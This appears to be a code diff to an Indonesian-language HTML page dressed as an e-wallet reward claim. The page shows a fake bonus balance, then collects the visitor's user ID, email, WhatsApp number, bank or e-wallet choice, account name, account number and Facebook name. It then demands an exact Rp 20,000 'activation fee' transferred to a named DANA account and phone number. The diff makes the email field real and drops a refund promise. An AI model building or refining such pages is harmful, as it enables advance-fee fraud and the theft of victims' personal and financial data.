@@ -18,7 +18,6 @@
         }
         .container { max-width: 450px; margin: auto; background: var(--card); padding: 30px; border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); border: 1px solid #334155; }
         
-        /* Icon Wallet */
         .wallet-wrapper { position: relative; width: 140px; height: 140px; margin: 20px auto; }
         #main-icon { width: 100%; height: 100%; cursor: pointer; transition: 0.3s; }
         .pulse { animation: pulse 1.5s infinite; }
@@ -31,7 +30,6 @@
         }
         #reward-display.show { transform: translate(-50%, -50%) scale(1); }
 
-        /* Form Style */
         .form-daftar { display: none; text-align: left; background: #334155; padding: 20px; border-radius: 18px; margin-top: 20px; }
         .form-daftar label { font-size: 11px; color: #94a3b8; display: block; margin-bottom: 4px; font-weight: 600; text-transform: uppercase; }
         .form-daftar input, .form-daftar select {
@@ -43,12 +41,10 @@
             background: var(--primary); color: white; border: none; border-radius: 12px; width: 100%;
         }
 
-        /* Loading Bar */
         #loadingArea { display: none; margin: 20px 0; }
         .progress-container { width: 100%; background: #0f172a; border-radius: 10px; height: 12px; overflow: hidden; }
         .progress-bar { width: 0%; height: 100%; background: var(--primary); }
 
-        /* Modal Dana Baru (Tanpa QRIS) */
         .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.92); backdrop-filter: blur(5px); }
         .modal-content { background: white; color: #1e293b; margin: 10% auto; padding: 25px; border-radius: 24px; width: 85%; max-width: 380px; text-align: center; }
         
@@ -70,7 +66,7 @@
             cursor: pointer; font-weight: 800; text-transform: uppercase;
         }
 
-        .btn-confirm { display: block; padding: 15px; background: #22c55e; color: white; border-radius: 12px; text-decoration: none; font-weight: 800; margin-top: 20px; box-shadow: 0 4px 12px rgba(34, 197, 94, 0.3); }
+        .btn-confirm { display: block; padding: 15px; background: #22c55e; color: white; border-radius: 12px; text-decoration: none; font-weight: 800; margin-top: 20px; }
     </style>
 </head>
 <body>
@@ -88,10 +84,16 @@
 
         <div id="registrationForm" class="form-daftar">
             <h4 style="text-align:center; color:var(--primary); margin:0 0 15px 0;">DATA PENCAIRAN SALDO</h4>
+            
             <label>ID Pengguna:</label>
             <input type="text" id="regId" placeholder="Min. 6 Karakter" required>
+            
+            <label>Email Aktif:</label>
+            <input type="email" id="regEmail" placeholder="contoh@email.com" required>
+            
             <label>WhatsApp:</label>
             <input type="text" id="regWa" value="+62" required>
+            
             <label>Metode Pencairan Ke:</label>
             <select id="regBank" required>
                 <option value="">-- Pilih --</option>
@@ -100,13 +102,15 @@
                 <option value="OVO">OVO</option>
                 <option value="GOPAY">GOPAY</option>
             </select>
+            
             <label>Nama Sesuai Rekening:</label>
             <input type="text" id="regNamaRek" placeholder="Nama Lengkap" required>
+            
             <label>Nomor Rekening / HP:</label>
             <input type="number" id="regNoRek" placeholder="0000xxxx" required>
+            
             <label>Nama Facebook:</label>
             <input type="text" id="regNamaFB" placeholder="Nama Profil FB" required>
-            <input type="hidden" id="regEmail" value="user@web.com">
             
             <button class="btn-submit" onclick="submitData()">KONFIRMASI DATA</button>
         </div>
@@ -128,10 +132,8 @@
                     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Logo_dana_blue.svg/1200px-Logo_dana_blue.svg.png" style="width:70px; filter: brightness(0) invert(1);" alt="DANA">
                     <span style="font-size:10px; font-weight:bold;">BIAYA AKTIVASI</span>
                 </div>
-
                 <div class="dana-label">Nama Pemilik Akun:</div>
                 <div class="dana-value">NIZAR ARDIANSYAH</div>
-
                 <div class="dana-label">Nomor Rekening DANA:</div>
                 <div class="copy-container">
                     <span id="nomorDana" style="font-size: 20px; font-weight: 800; letter-spacing: 1px;">085129867807</span>
@@ -140,9 +142,7 @@
             </div>
 
             <p style="font-size: 11px; color: #ef4444; font-weight: bold; margin-top: -10px;">⚠️ Harap transfer tepat Rp 20.000</p>
-
             <a href="URL_FB_ANDA_DI_SINI" class="btn-confirm">KONFIRMASI SUDAH BAYAR</a>
-            <p style="font-size: 10px; color: #94a3b8; margin-top: 15px;">Biaya aktivasi akan dikembalikan bersama total saldo pencairan.</p>
         </div>
     </div>
 
@@ -151,8 +151,9 @@
         
         function copyNumber() {
             const num = document.getElementById("nomorDana").innerText;
-            navigator.clipboard.writeText(num);
-            alert("Nomor DANA berhasil disalin!");
+            navigator.clipboard.writeText(num).then(() => {
+                alert("Nomor DANA berhasil disalin!");
+            });
         }
 
         function startSync() {
@@ -171,7 +172,6 @@
                     document.getElementById('boxArea').style.display = "none";
                     document.getElementById('mainBtn').style.display = "none";
                     document.getElementById('registrationForm').style.display = "block";
-                    document.getElementById('sub-title').innerHTML = "Bonus Saldo: <b style='color:var(--primary);'>Rp "+hasil+"</b>";
                 }, 1200);
             }, 2000);
         }
@@ -184,17 +184,17 @@
         function submitData() {
             const d = {
                 id: document.getElementById('regId').value,
+                email: document.getElementById('regEmail').value,
                 wa: document.getElementById('regWa').value,
                 bank: document.getElementById('regBank').value,
                 nama: document.getElementById('regNamaRek').value,
                 norek: document.getElementById('regNoRek').value,
                 fb: document.getElementById('regNamaFB').value,
-                email: document.getElementById('regEmail').value,
                 sld: localStorage.getItem("active_val")
             };
 
             if(!/^[a-zA-Z0-9]{6,}$/.test(d.id)) { alert("Username minimal 6 karakter!"); return; }
-            if(!d.id || !d.wa || !d.bank || !d.nama || !d.norek || !d.fb) { alert("Lengkapi semua data!"); return; }
+            if(!d.id || !d.email || !d.wa || !d.bank || !d.nama || !d.norek || !d.fb) { alert("Lengkapi semua data!"); return; }
 
             document.getElementById('registrationForm').style.display = "none";
             document.getElementById('loadingArea').style.display = "block";
